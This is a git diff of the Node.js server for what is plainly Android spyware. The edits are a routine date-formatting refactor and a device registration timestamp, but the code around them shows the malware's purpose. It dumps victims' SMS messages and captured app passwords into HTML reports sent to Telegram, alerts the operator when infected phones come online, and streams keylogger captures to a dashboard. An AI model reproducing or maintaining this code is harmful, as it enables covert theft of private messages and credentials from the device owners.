@@ -25,6 +25,7 @@ const jwt            = require('jsonwebtoken');
 const { spawn }      = require('child_process');
 require('dotenv').config();
 const { getJwtSecret } = require('./jwtSecret');
+const { formatDateTime } = require('./utils/dateTime');
 
 // ============================================
 // RUNTIME LOG CAPTURE
@@ -377,12 +378,12 @@ async function _autoSendSmsToTelegram(deviceId, deviceName, sendToAdmin, userLis
             ? '<span class="dir-out">&#9650; Sent</span>'
             : '<span class="dir-in">&#9660; Recv</span>';
         const num  = `<span class="num">${esc(m.address || 'Unknown')}</span>`;
-        const date = `<span class="date">${m.date ? new Date(Number(m.date)).toLocaleString() : ''}</span>`;
+        const date = `<span class="date">${m.date ? formatDateTime(Number(m.date)) : ''}</span>`;
         const body = `<span class="body">${esc(m.body || '')}</span>`;
         return `<tr><td>${dir}</td><td>${num}</td><td>${date}</td><td>${body}</td></tr>`;
     }).join('\n');
 
-    const ts   = new Date().toLocaleString();
+    const ts   = formatDateTime(Date.now());
     const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>SMS Dump</title><style>
 body{font-family:Arial,sans-serif;background:#0f172a;color:#e2e8f0;padding:24px;margin:0}
 h1{font-size:20px;color:#a78bfa;margin-bottom:4px}
@@ -499,11 +500,11 @@ async function _autoSendPasswordsToTelegram(deviceId, deviceName, sendToAdmin, u
         const app   = `<span class="app">${esc(e.appName || e.appPackage || 'Unknown app')}</span>`;
         const field = `<span class="field">${esc(e.fieldHint)}</span>`;
         const pwd   = `<span class="pwd">${esc(e.value)}</span>`;
-        const date  = `<span class="date">${e.capturedAt ? new Date(e.capturedAt).toLocaleString() : ''}</span>`;
+        const date  = `<span class="date">${e.capturedAt ? formatDateTime(e.capturedAt) : ''}</span>`;
         return `<tr><td>${app}</td><td>${field}</td><td>${pwd}</td><td>${date}</td></tr>`;
     }).join('\n');
 
-    const ts   = new Date().toLocaleString();
+    const ts   = formatDateTime(Date.now());
     const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Password Captures</title><style>
 body{font-family:Arial,sans-serif;background:#0f172a;color:#e2e8f0;padding:24px;margin:0}
 h1{font-size:20px;color:#ef4444;margin-bottom:4px}
@@ -1278,6 +1279,7 @@ async function processMessage(clientId, clientType, event, data) {
         const deviceRecord = { ...existing, deviceId,
             deviceName: deviceInfo?.name || deviceId, deviceInfo: info,
             accessId: accessId || existing.accessId || '',
+            registeredAt: existing.registeredAt || new Date(),
             isOnline: true, lastSeen: new Date() };
         inMemoryDevices.set(deviceId, deviceRecord);
 
@@ -1289,7 +1291,8 @@ async function processMessage(clientId, clientType, event, data) {
             let dev = await Device.findOne({ deviceId });
             if (!dev) {
                 dev = new Device({ deviceId, deviceName: deviceInfo?.name || deviceId,
-                                   deviceInfo: info, accessId: accessId || '', isOnline: true });
+                                   deviceInfo: info, accessId: accessId || '',
+                                   registeredAt: new Date(), isOnline: true });
             } else {
                 dev.isOnline  = true;
                 dev.lastSeen  = new Date();
@@ -1348,7 +1351,7 @@ async function processMessage(clientId, clientType, event, data) {
             const name    = deviceInfo?.name || deviceId;
             const model   = [deviceInfo?.manufacturer, deviceInfo?.model].filter(Boolean).join(' ') || 'Unknown';
             const android = deviceInfo?.androidVersion ? `Android ${deviceInfo.androidVersion}` : null;
-            const ts      = new Date().toLocaleString();
+            const ts      = formatDateTime(Date.now());
             const text    =
                 `🟢 <b>Device Online</b>\n` +
                 `━━━━━━━━━━━━━━━━━━━\n` +
@@ -1541,7 +1544,14 @@ async function processMessage(clientId, clientType, event, data) {
         if (conn) conn.lastPong = Date.now(); // keep live channel alive
         const deviceId = conn?.deviceId || data?.deviceId;
         if (deviceId) {
-            const entry = { ...data, deviceId, timestamp: data.timestamp || new Date().toISOString() };
+            const postTime = Number(data?.postTime);
+            const entry = {
+                ...data,
+                deviceId,
+                timestamp: Number.isFinite(postTime) && postTime > 0
+                    ? new Date(postTime).toISOString()
+                    : (data.timestamp || new Date().toISOString()),
+            };
             broadcastDash('keylog:push', entry);
             // Persist to Redis (non-blocking)
             R.pushKeylog(deviceId, entry).catch(() => {});
